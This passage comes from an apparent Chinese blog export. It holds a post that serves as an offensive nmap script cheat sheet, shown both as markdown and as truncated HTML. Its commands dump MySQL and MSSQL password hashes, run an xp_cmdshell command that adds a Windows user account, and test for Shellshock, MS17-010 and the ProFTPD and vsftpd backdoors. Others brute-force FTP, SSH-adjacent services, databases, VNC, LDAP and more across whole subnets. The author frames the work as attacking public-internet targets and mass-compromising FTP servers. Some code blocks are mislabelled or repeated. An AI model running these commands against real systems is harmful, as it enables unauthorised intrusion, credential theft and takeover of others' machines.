title=\"MISC：\"></a>MISC：</h4><ul>\n<li>-6：启用IPv6扫描</li>\n<li>-A：启用OS检测，版本检测，脚本扫描和traceroute</li>\n<li>-datadir <dirname>：指定自定义Nmap数据文件位置</dirname></li>\n<li>-send-eth / -send-ip：使用原始以太网帧进行发送或IP数据包</li>\n<li>-privileged：假设用户具有完全特权</li>\n<li>-unprivileged：假定用户缺少原始套接字权限</li>\n<li>-V：打印版本号</li>\n<li>-h：打印此帮助摘要页面</li>\n</ul>\n<h4 id=\"另见\"><a href=\"#另见\" class=\"headerlink\" title=\"另见\"></a>另见</h4><p>虽然它最为流行，但是 Nmap 不是唯一可用的端口扫描器，并且，取决于不同的喜好，可能也不是最好的。下面是 Kali 中包含的一些其它的替代品：</p>\n<ul>\n<li>unicornscan</li>\n<li>hping3</li>\n<li>masscan</li>\n<li>amap</li>\n<li>Metasploit scanning module</li>\n</ul>"},{"layout":"post","title":"nmap脚本检测","abbrlink":63116,"_content":"\n### 前言\n\n在实战中相对比较实用的nmap脚本\n\n<!--more-->\n\n```\n# nmap -sV -sT -Pn –open -v 192.168.3.23\n```\n\n也可以尝试先获取下目标机器各个服务更详细的banner信息,因为有些服务工具漏洞只能影响特定的版本,所以,提前知道一下还是非常有必要的:\n\n```\n# nmap -sT -Pn –open -v banner.nse 192.168.3.23\n```\n\n### 和ftp相关的一些漏洞检测脚本:\n\nftp-anon.nse 检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡\n\n```\n# nmap -p 21 –script ftp-anon.nse -v 192.168.3.23\n```\n\nftp-brute.nse ftp爆破脚本 [只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破]\n\n```\n# nmap -p 21 –script ftp-brute.nse -v 192.168.3.23\n```\n\nftp-vuln-cve2010-4221.nse ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出\n\n```\n# nmap -p 21 –script ftp-vuln-cve2010-4221.nse -v 192.168.3.23\n```\n\nftp-proftpd-backdoor.nse ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令\n\n\n```\n# nmap -p 21 –script ftp-vuln-cve2010-4221.nse -v 192.168.3.23\n```\n\nftp-vsftpd-backdoor.nse VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门\n\n```\n# nmap -p 21 –script ftp-vsftpd-backdoor.nse -v 192.168.3.23\n```\n\n\n### 和ssh 相关的一些扫描脚本:\n\nsshv1.nse sshv1是可以中间人的\n\n```\n# nmap -p 22 –script sshv1.nse -v 192.168.3.23\n```\n\n\n### 和smtp 相关的一些扫描脚本:\n\nsmtp-brute.nse 简单爆破smtp\n\n```\n# nmap -p 25 –script smtp-brute.nse -v 192.168.3.23\n```\n\n\nsmtp-enum–users.nse 枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行\n\n\n```\n# nmap -p 25 –script smtp-enum-users.nse -v 192.168.3.23\n```\n\n\nsmtp-vuln-cve2010-4344.nse Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出\n\n```\n# nmap -p 25 –script smtp-vuln-cve2010-4344.nse -v 192.168.3.23\n```\n\n\nsmtp-vuln-cve2011-1720.nse Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出\n\n\n```\n# nmap -p 25 –script smtp-vuln-cve2011-1720.nse -v 192.168.3.23\n```\n\nsmtp-vuln-cve2011-1764.nse Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了\n\n```\n# nmap -p 25 –script smtp-vuln-cve2011-1764.nse -v 192.168.3.23\n```\n\n### 和pop3 相关的一些扫描脚本:\n\npop3-brute.nse pop简单弱口令爆破\n\n```\n# nmap -p 110 –script pop3-brute.nse -v 192.168.3.23\n```\n\n###  和imap 相关的一些扫描脚本:\n\nimap-brute.nse imap简单弱口令爆破\n\n```\n# nmap -p 143,993 –script imap-brute.nse -v 192.168.3.23\n```\n\n### 和dns 相关的一些漏洞扫描脚本:\n\ndns-zone-transfer.nse 检查目标ns服务器是否允许传送\n\n```\n# nmap -p 53 –script dns-zone-transfer.nse -v 192.168.3.23\n```\n```\n# nmap -p 53 –script dns-zone-transfer.nse –script-args dns-zone-transfer.domain=target.org -v 192.168.3.23\n```\n\nhostmap-ip2hosts.nse 旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉\n\n\n```\n# nmap -p80 –script hostmap-ip2hosts.nse 192.168.3.23\n```\n\n\n### 和各种数据库相关的扫描脚本:\n\ninformix-brute.nse informix爆破脚本\n\n```\n# nmap -p 9088 –script informix-brute.nse 192.168.3.23\n```\n\n\nmysql-empty-password.nse mysql 扫描root空密码\n\n\n```\nmysql-empty-password.nse mysql 扫描root空密码\n```\n\n\nmysql-brute.nse mysql root弱口令简单爆破\n\n```\n# nmap -p 3306 –script mysql-brute.nse -v 192.168.3.23\n```\n\nmysql-dump-hashes.nse 导出mysql中所有用户的hash\n\n```\n# nmap -p 3306 –script mysql-dump-hashes –script-args=’username=root,password=root’ 192.168.3.23\n```\n\nmysql-vuln-cve2012-2122.nse Mysql身份认证漏洞[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高]\n\n\n```\n# nmap -p 3306 –script mysql-vuln-cve2012-2122.nse -v 192.168.3.23\n```\n\n\n```\nnmap -p 445 –script ms-sql-info.nse -v 203.124.11.0/24 ms-sql-info.nse 扫描C段mssql\n```\n\n```\n# nmap -p 1433 –script ms-sql-info.nse –script-args mssql.instance-port=1433 -v 192.168.3.0/24\n```\n\n\n\nms-sql-empty-password.nse 扫描mssql sa空密码\n\n```\n# nmap -p 1433 –script ms-sql-empty-password.nse -v 192.168.3.0/24\n```\n\n\nms-sql-brute.nse sa弱口令爆破\n\n```\n# nmap -p 1433 –script ms-sql-brute.nse -v 192.168.3.0/24\n```\n\n\nms-sql-xp-cmdshell.nse 利用xp_cmdshell,远程执行系统命令\n\n\n```\n# nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=“net user test test /add” 192.168.3.0/24\n```\n\n\nms-sql-dump-hashes.nse 导出mssql中所有的数据库用户及密码hash\n\n\n```\n# nmap -p 1433 –script ms-sql-dump-hashes -v 192.168.3.0/24\n```\n\n\npgsql-brute.nse 尝试爆破postgresql\n\n\n```\n# nmap -p 5432 –script pgsql-brute -v 192.168.3.0/24\n```\n\n\noracle-brute-stealth.nse 尝试爆破oracle\n\n```\n# nmap –script oracle-brute-stealth -p 1521 –script-args oracle-brute-stealth.sid=ORCL -v 192.168.3.0/24\n```\n\n\noracle-brute.nse\n\n```\n# nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL -v 192.168.3.0/24\n```\n\n\nmongodb-brute.nse 尝试爆破mongdb\n\n\n```\n# nmap -p 27017 –script mongodb-brute 192.168.3.0/24\n```\n\n\nredis-brute.nse redis爆破\n\n\n```\n# nmap -p 6379 –script redis-brute.nse 192.168.3.0/24\n```\n\n\n### 和snmp相关的一些扫描脚本:\n\nsnmp-brute.nse 爆破C段的snmp\n\n```\n# nmap -sU –script snmp-brute –script-args snmp-brute.communitiesdb=user.txt 192.168.3.0/24\n```\n\n### 和telnet相关的一些扫描脚本:\n\ntelnet-brute.nse 简单爆破telnet\n\n```\n# nmap -p 23 –script telnet-brute –script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.3.0/24\n```\n\n### 和ldap服务相关的一些利用脚本:\n\nldap-brute.nse 简单爆破ldap\n\n```\n# nmap -p 389 –script ldap-brute –script-args ldap.base=’“cn=users,dc=cqure,dc=net”‘ 192.168.3.0/24\n```\n\n\n### 和各类web中间件,web集成环境相关的一些利用脚本:\n\nxmpp-brute.nse xmpp爆破\n\n```\n# nmap -p 5222 –script xmpp-brute.nse 192.168.3.0/24\n```\n\nhttp-iis-short-name-brute.nse 短文件扫描\n\n```\n# nmap -p80 –script http-iis-short-name-brute.nse 192.168.3.0/24\n```\n\n\nhttp-iis-webdav-vuln.nse iis 5.0 /6.0 webadv写\n\n\n```\n# nmap –script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0/24\n```\n\n\nhttp-shellshock.nse bash远程执行\n\n\n```\n# nmap -sV -p- –script http-shellshock –script-args uri=/cgi-bin/bin,cmd=ls 192.168.3.0/24\n```\n\n\nhttp-svn-info.nse 探测目标svn\n\n\n```\n# nmap –script http-svn-info 192.168.3.0/24\n```\n\nhttp-drupal-enum.nse 其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来\n\n\nhttp-wordpress-brute.nse\n\n\n```\n# nmap -p80 -sV –script http-wordpress-brute –script-args ‘userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true’ 192.168.3.0/24\n```\n\n\n\nhttp-backup-finder.nse 扫描目标网站备份\n\n\n```\n# nmap -p80 –script=http-backup-finder 192.168.3.0/24\n```\n\n\nhttp-vuln-cve2015-1635.nse iis6.0远程代码执行\n\n```\n# nmap -sV –script http-vuln-cve* –script-args uri=’/anotheruri/’ 192.168.3.0/24\n```\n\n### 跟vpn相关的一些利用脚本\n\npptp-version.nse 识别目标pptp版本\n\n\n```\n# nmap -p 1723 –script pptp-version.nse 192.168.3.0/24\n```\n\n\n### smb漏洞检测脚本集:\n\n\n- smb-vuln-ms08-067.nse\n- smb-vuln-ms10-054.nse\n- smb-vuln-ms10-061.nse\n- smb-vuln-ms17-010.nse smb远程执行\n\n```\n# nmap -p445 –script smb-vuln-ms17-010.nse 192.168.3.0/24\n```\n\n### 检测内网嗅探\n\n\nsniffer-detect.nse\n\n```\n# nmap -sn -Pn –script sniffer-detect.nse 192.168.3.0/24\n```\n\n\n### 其它的一些辅助性脚本:\n\nrsync-brute.nse 爆破目标的rsync\n\n```\n# nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.3.0/24\n```\n\n\nrlogin-brute.nse 爆破目标的rlogin\n\n```\n# nmap -p 513 –script rlogin-brute 192.168.3.0/24\n```\n\nvnc-brute.nse 爆破目标的vnc\n\n```\n# nmap –script vnc-brute -p 5900 192.168.3.0/24\n```\n\npcanywhere-brute.nse 爆破pcanywhere\n\n```\n# nmap -p 5631 –script=pcanywhere-brute 192.168.3.0/24\n```\n\nnessus-brute.nse 爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧\n\n```\n# nmap –script nessus-brute -p 1241 192.168.3.0/24\n```\n\nnexpose-brute.nse 爆破nexpose\n\n```\n# nmap –script nexpose-brute -p 3780 192.168.0.0/24\n```\n\n\nshodan-api.nse 配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的\n\n```\n# nmap –script shodan-api –script-args ‘shodan-api.target=192.168.0.0/24,shodan-api.apikey=SHODANAPIKEY’\n```\n\n\n0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描\n\n\n实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描:\n\n\n```\n# nmap -sT -Pn -v –script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012–1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24\n```\n\n尝试利用nmap一句话进行目标C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率:\n\n```\n# nmap -sT -v -Pn –script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.0.0/24\n```\n\n","source":"_posts/2019/9/nmap脚本检测.md","raw":"---\nlayout: post\ntitle: nmap脚本检测\ntags:\n  - tool\ncategories:\n  - hacker\nabbrlink: 63116\n---\n\n### 前言\n\n在实战中相对比较实用的nmap脚本\n\n<!--more-->\n\n```\n# nmap -sV -sT -Pn –open -v 192.168.3.23\n```\n\n也可以尝试先获取下目标机器各个服务更详细的banner信息,因为有些服务工具漏洞只能影响特定的版本,所以,提前知道一下还是非常有必要的:\n\n```\n# nmap -sT -Pn –open -v banner.nse 192.168.3.23\n```\n\n### 和ftp相关的一些漏洞检测脚本:\n\nftp-anon.nse 检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡\n\n```\n# nmap -p 21 –script ftp-anon.nse -v 192.168.3.23\n```\n\nftp-brute.nse ftp爆破脚本 [只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破]\n\n```\n# nmap -p 21 –script ftp-brute.nse -v 192.168.3.23\n```\n\nftp-vuln-cve2010-4221.nse ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出\n\n```\n# nmap -p 21 –script ftp-vuln-cve2010-4221.nse -v 192.168.3.23\n```\n\nftp-proftpd-backdoor.nse ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令\n\n\n```\n# nmap -p 21 –script ftp-vuln-cve2010-4221.nse -v 192.168.3.23\n```\n\nftp-vsftpd-backdoor.nse VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门\n\n```\n# nmap -p 21 –script ftp-vsftpd-backdoor.nse -v 192.168.3.23\n```\n\n\n### 和ssh 相关的一些扫描脚本:\n\nsshv1.nse sshv1是可以中间人的\n\n```\n# nmap -p 22 –script sshv1.nse -v 192.168.3.23\n```\n\n\n### 和smtp 相关的一些扫描脚本:\n\nsmtp-brute.nse 简单爆破smtp\n\n```\n# nmap -p 25 –script smtp-brute.nse -v 192.168.3.23\n```\n\n\nsmtp-enum–users.nse 枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行\n\n\n```\n# nmap -p 25 –script smtp-enum-users.nse -v 192.168.3.23\n```\n\n\nsmtp-vuln-cve2010-4344.nse Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出\n\n```\n# nmap -p 25 –script smtp-vuln-cve2010-4344.nse -v 192.168.3.23\n```\n\n\nsmtp-vuln-cve2011-1720.nse Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出\n\n\n```\n# nmap -p 25 –script smtp-vuln-cve2011-1720.nse -v 192.168.3.23\n```\n\nsmtp-vuln-cve2011-1764.nse Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了\n\n```\n# nmap -p 25 –script smtp-vuln-cve2011-1764.nse -v 192.168.3.23\n```\n\n### 和pop3 相关的一些扫描脚本:\n\npop3-brute.nse pop简单弱口令爆破\n\n```\n# nmap -p 110 –script pop3-brute.nse -v 192.168.3.23\n```\n\n###  和imap 相关的一些扫描脚本:\n\nimap-brute.nse imap简单弱口令爆破\n\n```\n# nmap -p 143,993 –script imap-brute.nse -v 192.168.3.23\n```\n\n### 和dns 相关的一些漏洞扫描脚本:\n\ndns-zone-transfer.nse 检查目标ns服务器是否允许传送\n\n```\n# nmap -p 53 –script dns-zone-transfer.nse -v 192.168.3.23\n```\n```\n# nmap -p 53 –script dns-zone-transfer.nse –script-args dns-zone-transfer.domain=target.org -v 192.168.3.23\n```\n\nhostmap-ip2hosts.nse 旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉\n\n\n```\n# nmap -p80 –script hostmap-ip2hosts.nse 192.168.3.23\n```\n\n\n### 和各种数据库相关的扫描脚本:\n\ninformix-brute.nse informix爆破脚本\n\n```\n# nmap -p 9088 –script informix-brute.nse 192.168.3.23\n```\n\n\nmysql-empty-password.nse mysql 扫描root空密码\n\n\n```\nmysql-empty-password.nse mysql 扫描root空密码\n```\n\n\nmysql-brute.nse mysql root弱口令简单爆破\n\n```\n# nmap -p 3306 –script mysql-brute.nse -v 192.168.3.23\n```\n\nmysql-dump-hashes.nse 导出mysql中所有用户的hash\n\n```\n# nmap -p 3306 –script mysql-dump-hashes –script-args=’username=root,password=root’ 192.168.3.23\n```\n\nmysql-vuln-cve2012-2122.nse Mysql身份认证漏洞[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高]\n\n\n```\n# nmap -p 3306 –script mysql-vuln-cve2012-2122.nse -v 192.168.3.23\n```\n\n\n```\nnmap -p 445 –script ms-sql-info.nse -v 203.124.11.0/24 ms-sql-info.nse 扫描C段mssql\n```\n\n```\n# nmap -p 1433 –script ms-sql-info.nse –script-args mssql.instance-port=1433 -v 192.168.3.0/24\n```\n\n\n\nms-sql-empty-password.nse 扫描mssql sa空密码\n\n```\n# nmap -p 1433 –script ms-sql-empty-password.nse -v 192.168.3.0/24\n```\n\n\nms-sql-brute.nse sa弱口令爆破\n\n```\n# nmap -p 1433 –script ms-sql-brute.nse -v 192.168.3.0/24\n```\n\n\nms-sql-xp-cmdshell.nse 利用xp_cmdshell,远程执行系统命令\n\n\n```\n# nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=“net user test test /add” 192.168.3.0/24\n```\n\n\nms-sql-dump-hashes.nse 导出mssql中所有的数据库用户及密码hash\n\n\n```\n# nmap -p 1433 –script ms-sql-dump-hashes -v 192.168.3.0/24\n```\n\n\npgsql-brute.nse 尝试爆破postgresql\n\n\n```\n# nmap -p 5432 –script pgsql-brute -v 192.168.3.0/24\n```\n\n\noracle-brute-stealth.nse 尝试爆破oracle\n\n```\n# nmap –script oracle-brute-stealth -p 1521 –script-args oracle-brute-stealth.sid=ORCL -v 192.168.3.0/24\n```\n\n\noracle-brute.nse\n\n```\n# nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL -v 192.168.3.0/24\n```\n\n\nmongodb-brute.nse 尝试爆破mongdb\n\n\n```\n# nmap -p 27017 –script mongodb-brute 192.168.3.0/24\n```\n\n\nredis-brute.nse redis爆破\n\n\n```\n# nmap -p 6379 –script redis-brute.nse 192.168.3.0/24\n```\n\n\n### 和snmp相关的一些扫描脚本:\n\nsnmp-brute.nse 爆破C段的snmp\n\n```\n# nmap -sU –script snmp-brute –script-args snmp-brute.communitiesdb=user.txt 192.168.3.0/24\n```\n\n### 和telnet相关的一些扫描脚本:\n\ntelnet-brute.nse 简单爆破telnet\n\n```\n# nmap -p 23 –script telnet-brute –script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.3.0/24\n```\n\n### 和ldap服务相关的一些利用脚本:\n\nldap-brute.nse 简单爆破ldap\n\n```\n# nmap -p 389 –script ldap-brute –script-args ldap.base=’“cn=users,dc=cqure,dc=net”‘ 192.168.3.0/24\n```\n\n\n### 和各类web中间件,web集成环境相关的一些利用脚本:\n\nxmpp-brute.nse xmpp爆破\n\n```\n# nmap -p 5222 –script xmpp-brute.nse 192.168.3.0/24\n```\n\nhttp-iis-short-name-brute.nse 短文件扫描\n\n```\n# nmap -p80 –script http-iis-short-name-brute.nse 192.168.3.0/24\n```\n\n\nhttp-iis-webdav-vuln.nse iis 5.0 /6.0 webadv写\n\n\n```\n# nmap –script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0/24\n```\n\n\nhttp-shellshock.nse bash远程执行\n\n\n```\n# nmap -sV -p- –script http-shellshock –script-args uri=/cgi-bin/bin,cmd=ls 192.168.3.0/24\n```\n\n\nhttp-svn-info.nse 探测目标svn\n\n\n```\n# nmap –script http-svn-info 192.168.3.0/24\n```\n\nhttp-drupal-enum.nse 其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来\n\n\nhttp-wordpress-brute.nse\n\n\n```\n# nmap -p80 -sV –script http-wordpress-brute –script-args ‘userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true’ 192.168.3.0/24\n```\n\n\n\nhttp-backup-finder.nse 扫描目标网站备份\n\n\n```\n# nmap -p80 –script=http-backup-finder 192.168.3.0/24\n```\n\n\nhttp-vuln-cve2015-1635.nse iis6.0远程代码执行\n\n```\n# nmap -sV –script http-vuln-cve* –script-args uri=’/anotheruri/’ 192.168.3.0/24\n```\n\n### 跟vpn相关的一些利用脚本\n\npptp-version.nse 识别目标pptp版本\n\n\n```\n# nmap -p 1723 –script pptp-version.nse 192.168.3.0/24\n```\n\n\n### smb漏洞检测脚本集:\n\n\n- smb-vuln-ms08-067.nse\n- smb-vuln-ms10-054.nse\n- smb-vuln-ms10-061.nse\n- smb-vuln-ms17-010.nse smb远程执行\n\n```\n# nmap -p445 –script smb-vuln-ms17-010.nse 192.168.3.0/24\n```\n\n### 检测内网嗅探\n\n\nsniffer-detect.nse\n\n```\n# nmap -sn -Pn –script sniffer-detect.nse 192.168.3.0/24\n```\n\n\n### 其它的一些辅助性脚本:\n\nrsync-brute.nse 爆破目标的rsync\n\n```\n# nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.3.0/24\n```\n\n\nrlogin-brute.nse 爆破目标的rlogin\n\n```\n# nmap -p 513 –script rlogin-brute 192.168.3.0/24\n```\n\nvnc-brute.nse 爆破目标的vnc\n\n```\n# nmap –script vnc-brute -p 5900 192.168.3.0/24\n```\n\npcanywhere-brute.nse 爆破pcanywhere\n\n```\n# nmap -p 5631 –script=pcanywhere-brute 192.168.3.0/24\n```\n\nnessus-brute.nse 爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧\n\n```\n# nmap –script nessus-brute -p 1241 192.168.3.0/24\n```\n\nnexpose-brute.nse 爆破nexpose\n\n```\n# nmap –script nexpose-brute -p 3780 192.168.0.0/24\n```\n\n\nshodan-api.nse 配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的\n\n```\n# nmap –script shodan-api –script-args ‘shodan-api.target=192.168.0.0/24,shodan-api.apikey=SHODANAPIKEY’\n```\n\n\n0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描\n\n\n实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描:\n\n\n```\n# nmap -sT -Pn -v –script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012–1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24\n```\n\n尝试利用nmap一句话进行目标C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率:\n\n```\n# nmap -sT -v -Pn –script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.0.0/24\n```\n\n","slug":"2019/9/nmap脚本检测","published":1,"date":"2019-09-09T07:41:32.468Z","updated":"2020-04-12T06:34:43.628Z","comments":1,"photos":[],"link":"","_id":"ck9z76w00002344vqsn7cg7nb","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>在实战中相对比较实用的nmap脚本</p>\n<a id=\"more\"></a>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sV</span> <span class=\"selector-tag\">-sT</span> <span class=\"selector-tag\">-Pn</span> –<span class=\"selector-tag\">open</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>也可以尝试先获取下目标机器各个服务更详细的banner信息,因为有些服务工具漏洞只能影响特定的版本,所以,提前知道一下还是非常有必要的:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sT</span> <span class=\"selector-tag\">-Pn</span> –<span class=\"selector-tag\">open</span> <span class=\"selector-tag\">-v</span> <span class=\"selector-tag\">banner</span><span class=\"selector-class\">.nse</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和ftp相关的一些漏洞检测脚本\"><a href=\"#和ftp相关的一些漏洞检测脚本\" class=\"headerlink\" title=\"和ftp相关的一些漏洞检测脚本:\"></a>和ftp相关的一些漏洞检测脚本:</h3><p>ftp-anon.nse 检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 21 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">ftp-anon</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>ftp-brute.nse ftp爆破脚本 [只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破]</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 21 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">ftp-brute</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>ftp-vuln-cve2010-4221.nse ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">21</span> –script ftp-vuln-cve2010<span class=\"number\">-4221.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>ftp-proftpd-backdoor.nse ProFTPD 1.3.3c 